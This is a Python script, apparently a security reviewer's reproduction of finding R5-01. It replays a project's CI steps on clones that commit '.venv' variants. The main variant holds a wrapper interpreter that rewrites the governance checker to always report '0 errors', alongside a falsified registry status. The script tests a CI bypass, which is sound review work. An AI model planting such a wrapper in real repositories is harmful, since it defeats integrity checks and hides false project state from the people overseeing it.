"""R5-01: replay the CI steps of the revision in $BASE, in the order its own .github/workflows/ci.yml gives, up to and
including the governance step, on a fresh clone of a commit that adds a committed environment variant.

Each variant is committed on top of $BASE's HEAD together with the same registry hand edit as the previous reviewer's
script (stage 00 IN_PROGRESS -> ACCEPTED_CLOSED; the honest checker reports errors for it), with PROJECT_STATUS.md
regenerated for it so that `render-status --check` passes and only `check` objects. The wrapper interpreter
rewrites cli.py so that `check` prints "0 errors" and logs every run to wrapper-ran.log.

Emulation: actions/checkout -> `git clone` of the commit (a fresh checkout); astral-sh/setup-uv -> the local uv
(0.11.32, the version ci.yml pins). Each `run:` is executed with `bash --noprofile --norc -eo pipefail -c`, as GitHub
does, with the job env (UV_PYTHON=3.12, PYTHONPATH=src). `--offline` is appended to `uv sync` (no network here).
The replay stops at the first failing step, as GitHub does.
"""
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

W = Path(os.environ["W"])
BASE = Path(os.environ["BASE"])
REAL = os.path.realpath(BASE / ".venv/bin/python")
CFG = (BASE / ".venv/pyvenv.cfg").read_text()
GENV = {**os.environ, "GIT_AUTHOR_NAME": "r", "GIT_AUTHOR_EMAIL": "r@x.invalid", "GIT_COMMITTER_NAME": "r",
        "GIT_COMMITTER_EMAIL": "r@x.invalid", "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull}
GENV.pop("VIRTUAL_ENV", None)
TOP = W / "sandbox-r501"
LAST = "Governance state and memory consistency"

WRAP = f'''#!/bin/sh
root="$(git -C "$(dirname "$0")" rev-parse --show-toplevel 2>/dev/null || pwd)"
cli="$root/src/citerift/governance/cli.py"
echo "wrapper ran: $0 $*" | cut -c1-120 >> "$root/wrapper-ran.log"
if [ -f "$cli" ] && ! grep -q REWRITTEN "$cli"; then
  {REAL} - "$cli" <<'PY'
import sys, pathlib
p = pathlib.Path(sys.argv[1]); t = p.read_text()
p.write_text(t.replace("def cmd_check(orc: Orchestrator, args: argparse.Namespace) -> int:\\n",
  "def cmd_check(orc: Orchestrator, args: argparse.Namespace) -> int:\\n    print('Consistency check: 0 errors, 0 warnings')  # REWRITTEN\\n    return 0\\n", 1))
PY
fi
exec {REAL} "$@"
'''


def git(d: Path, *a: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(["git", "-C", str(d), *a], capture_output=True, text=True, env=GENV, check=check)


def parse_steps(ci: str) -> list[tuple[str, str | None, str | None]]:
    """(name, uses, run) for the steps of the first job, up to the step named LAST. A minimal reader for this file:
    `- name:` starts a step; `uses:` and `run:` (inline, `|` literal or `>-` folded) are read by indentation."""
    lines = ci.splitlines()
    i = next(k for k, l in enumerate(lines) if l.strip() == "steps:") + 1
    steps: list[tuple[str, str | None, str | None]] = []
    cur: dict[str, str | None] | None = None
    while i < len(lines):
        l = lines[i]
        s = l.strip()
        if re.match(r"^\S", l) or re.match(r"^  \S", l):  # left the job
            break
        m = re.match(r"^(\s*)- name: (.*)$", l)
        if m:
            if cur:
                steps.append((cur["name"], cur.get("uses"), cur.get("run")))
                if cur["name"] == LAST:
                    return steps
            cur = {"name": m.group(2).strip()}
            i += 1
            continue
        m = re.match(r"^(\s*)(uses|run): ?(.*)$", l)
        if m and cur is not None:
            ind, key, val = len(m.group(1)), m.group(2), m.group(3).strip()
            if key == "uses":
                cur["uses"] = val.split("#")[0].strip()
            elif val in ("|", ">-", ">"):
                body = []
                i += 1
                while i < len(lines) and (not lines[i].strip() or len(lines[i]) - len(lines[i].lstrip()) > ind):
                    body.append(lines[i].strip())
                    i += 1
                cur["run"] = ("\n" if val == "|" else " ").join(b for b in body if b)
                continue
            else:
                cur["run"] = val
        i += 1
    if cur:
        steps.append((cur["name"], cur.get("uses"), cur.get("run")))
    return steps


def make_commit(label: str, plant) -> Path:
    work = TOP / f"{label}-work"
    subprocess.run(["git", "-c", "advice.detachedHead=false", "clone", "-q", str(BASE), str(work)], check=True, env=GENV)
    reg = work / "governance/stage_registry.json"
    reg.write_text(reg.read_text().replace('"status": "IN_PROGRESS"', '"status": "ACCEPTED_CLOSED"', 1))
    # Regenerate PROJECT_STATUS.md for the edited registry with the honest tool, so that only `check` objects.
    subprocess.run([REAL, "-P", "-m", "citerift.governance.cli", "--root", str(work), "render-status", "--write"],
                   check=True, capture_output=True, env={**GENV, "PYTHONPATH": str(BASE / "src")})
    if plant is not p_gitlink:
        plant(work)
    git(work, "add", "-A")
    if plant is p_gitlink:  # after `add -A`, which would otherwise drop the gitlink that has no directory
        plant(work)
    git(work, "add", "-f", "--", *[p for p in (".venv", "tools") if (work / p).exists() or (work / p).is_symlink()],
        check=False)
    git(work, "commit", "-qm", f"variant: {label}")
    return work


def env_dir(d: Path) -> None:
    (d / "bin").mkdir(parents=True)
    (d / "pyvenv.cfg").write_text(CFG)
    (d / "bin/python").write_text(WRAP)
    os.chmod(d / "bin/python", 0o755)
    os.symlink("python", d / "bin/python3")


def p_none(w: Path) -> None:
    pass


def p_dir(w: Path) -> None:
    env_dir(w / ".venv")


def p_symlink_to_dir(w: Path) -> None:
    env_dir(w / "tools/env")
    os.symlink("tools/env", w / ".venv")


def p_dangling(w: Path) -> None:
    os.symlink("does-not-exist", w / ".venv")


def p_file(w: Path) -> None:
    (w / ".venv").write_text("not an environment\n")


def p_abs_symlink(w: Path) -> None:
    os.symlink("/nonexistent/abs/env", w / ".venv")


def p_gitlink(w: Path) -> None:
    sha = git(w, "rev-parse", "HEAD").stdout.strip()
    git(w, "update-index", "--add", "--cacheinfo", f"160000,{sha},.venv")


def p_nested(w: Path) -> None:
    env_dir(w / "docs/.venv")


def p_case(w: Path) -> None:
    env_dir(w / ".VENV")


VARIANTS = [
    ("control-no-venv", p_none, "no committed environment (control)"),
    ("dir", p_dir, ".venv directory with pyvenv.cfg and a wrapper bin/python (original R5-01 exploit)"),
    ("symlink-dir", p_symlink_to_dir, ".venv -> tools/env, a committed environment elsewhere in the tree"),
    ("dangling", p_dangling, ".venv dangling relative symlink"),
    ("abs-symlink", p_abs_symlink, ".venv symlink to an absolute path that does not exist"),
    ("file", p_file, ".venv as a regular file"),
    ("gitlink", p_gitlink, ".venv as a gitlink (submodule entry); checkout makes an empty directory"),
    ("nested", p_nested, "docs/.venv (environment in a subdirectory, not the project root)"),
    ("case", p_case, ".VENV (other case)"),
]


def main() -> None:
    shutil.rmtree(TOP, ignore_errors=True)
    TOP.mkdir(parents=True)
    rev = git(BASE, "rev-parse", "HEAD").stdout.strip()
    ci_text = (BASE / ".github/workflows/ci.yml").read_text()
    steps = parse_steps(ci_text)
    print(f"revision {rev}; steps replayed from its ci.yml: {[s[0] for s in steps]}")
    only = sys.argv[1:]
    for label, plant, desc in VARIANTS:
        if only and label not in only:
            continue
        work = make_commit(label, plant)
        ls = git(work, "ls-files", "-s", "--", ".venv", "tools", "docs/.venv", ".VENV").stdout.split("\n")
        ls = [" ".join(x.split()[:1] + x.split()[3:]) for x in ls if x]
        ci = TOP / f"{label}-ci"
        subprocess.run(["git", "-c", "advice.detachedHead=false", "clone", "-q", str(work), str(ci)], check=True, env=GENV)
        print(f"\n== {label}: {desc}\n   committed: {ls or 'nothing under .venv'}; in checkout: "
              f"exists={os.path.exists(ci / '.venv')} islink={os.path.islink(ci / '.venv')}")
        honest = subprocess.run([REAL, "-P", "-m", "citerift.governance.cli", "check"], cwd=ci, capture_output=True,
                                text=True, env={**GENV, "PYTHONPATH": str(BASE / "src")})
        print("   honest checker on this commit (run from outside):", honest.stdout.splitlines()[0])
        jenv = {**GENV, "UV_PYTHON": "3.12", "PYTHONPATH": "src"}
        for name, uses, run in steps:
            if uses:
                print(f"   [{name}] uses {uses.split('@')[0]}: emulated")
                continue
            cmd = re.sub(r"\buv sync\b([^\n]*)", r"uv sync\1 --offline", run or "")
            r = subprocess.run(["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", cmd], cwd=ci,
                               capture_output=True, text=True, env=jenv)
            out = [l for l in (r.stdout + r.stderr).splitlines() if "UV_NATIVE_TLS" not in l and l.strip()]
            tail = " / ".join(out[-2:])[:240]
            print(f"   [{name}] $ {cmd.replace(chr(10), ' ; ')}\n      exit {r.returncode}: {tail}")
            if r.returncode != 0:
                print(f"   -> job stops at [{name}]")
                break
        log = ci / "wrapper-ran.log"
        print(f"   wrapper ran: {len(log.read_text().splitlines()) if log.exists() else 0} times; "
              f"git status: {git(ci, 'status', '--porcelain').stdout.strip().splitlines() or 'clean'}")


main()
